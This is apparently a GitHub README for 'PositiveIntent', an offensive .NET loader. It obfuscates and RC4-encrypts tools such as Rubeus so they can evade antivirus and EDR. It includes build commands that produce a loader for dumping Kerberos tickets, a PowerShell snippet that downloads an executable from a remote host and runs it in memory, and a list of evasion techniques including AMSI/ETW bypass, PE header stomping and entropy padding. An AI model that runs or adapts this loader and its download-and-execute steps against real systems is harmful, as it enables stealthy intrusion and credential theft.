# PositiveIntent

<img width="2560" height="1307" alt="image" src="https://github.com/user-attachments/assets/ac3b80a1-8180-4e54-9619-a9779f44af60" />

## Installation

```
docker pull mono:latest
pipx install git+https://github.com/Mister-Joe/PositiveIntent.git
```

## Example Usage

### Building

```
pi_build --file .\log.txt --hostname DC01 --args 'dump /nowrap' --writetofile

[+] Updated loader source files
[+] Obfuscated Rubeus.exe
[+] Encrypted and embedded Rubeus.exe as a resource file
[*] Your decryption key is NnoKbpoDocyyXhJQ
[*] Building loader...please hold.
[+] Obfuscated loader
[+] Adjusted entropy of loader to: 5.5
[+] Loader compiled to strudel_patroller.exe
```

### Decrypting log file

```
pi_decrypt --file .\log.txt --key NnoKbpoDocyyXhJQ
﻿
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


Action: Dump Kerberos Ticket Data (All Users)

...snip...
```

### Reflectively Loading

> [!TIP]
> You may or may not want to do this depending on the environment and EDR you're up against. Ideal usage is connecting over RDP, right click on loader -> run as administrator -> copy the log file off and decrypt.

```
$bytes = (Invoke-WebRequest -Uri 'http://192.168.0.250/trap_hospitality.exe' -UseBasicParsing).Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entrypoint = $assembly.EntryPoint; [string[]]$arguments = '<your args here if not using --args>'.Split(' ')
[System.Environment]::CurrentDirectory = (Get-Location).Path
$entrypoint.Invoke($null, @(,$arguments))
```

## Features

- AMSI and ETW bypassed via hardware breakpoints using the VEH² technique. No usage of SetThreadContext. No memory patching.
- Obfuscation pipeline built with Mono.Cecil obfuscates both your input assembly as well as the loader.
- PE headers of your assembly (after it's been decrypted and loaded by the CLR) are stomped to hide it from memory page scanners looking for implanted PE signatures.
- Your assembly of choice (Rubeus etc.) is embedded in the loader in chunks as resource files and RC4 encrypted. Reconstructed on runtime.
- Optional flag to redirect output to an encrypted file. Useful to avoid outputting signatured text to console (e.g. tool logos).
- Optional flag to hardcode arguments to be passed to your assembly. Useful to avoid passing signatured arguments on the command line.
- No suspicious usage of crypto libraries - RC4 encryption/decryption is performed using a "raw" implementation of the RC4 algorithm (thanks ChatGPT).
- No P/Invoke usage. D/Invoke only.
- Copyright free English books are embedded as resource files in the loader to keep Shannon entropy between 4.50-5.50.
- Hostname keying.
- Built with .NET Framework 4.5.1 and C# 7.3 for compatibility with various Windows versions.

## References
[CrowdStrike Researchers Investigate the Threat of Patchless AMSI Bypass Attacks](https://www.crowdstrike.com/en-us/blog/crowdstrike-investigates-threat-of-patchless-amsi-bypass-attacks/)  
[Anatomy of a .NET Assembly – The DOS Stub](https://www.red-gate.com/simple-talk/blogs/anatomy-of-a-net-assembly-the-dos-stub/)  
[A Dive Into the PE File Format](https://0xrick.github.io/win-internals/pe3)  
[Hiding your .NET - ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw/)  
[Hardware Breakpoints and Structured/Vectored Exception Handling](https://www.codereversing.com/archives/76)  
[Meterpreter vs Modern EDR(s)](https://redops.at/en/blog/meterpreter-vs-modern-edrs-in-2023)  
[Red Team Tradecraft: Loading Encrypted C# Assemblies In Memory](https://www.mike-gualtieri.com/posts/red-team-tradecraft-loading-encrypted-c-sharp-assemblies-in-memory)  
[Building, Modifying, and Packing with Azure DevOps](https://blog.xpnsec.com/building-modifying-packing-devops/)  
[Announcing the .NET Framework 4.8](https://devblogs.microsoft.com/dotnet/announcing-the-net-framework-4-8/)  
[Understanding ETW Patching](https://jonny-johnson.medium.com/understanding-etw-patching-9f5af87f9d7b)  
[Claude](https://claude.ai/)
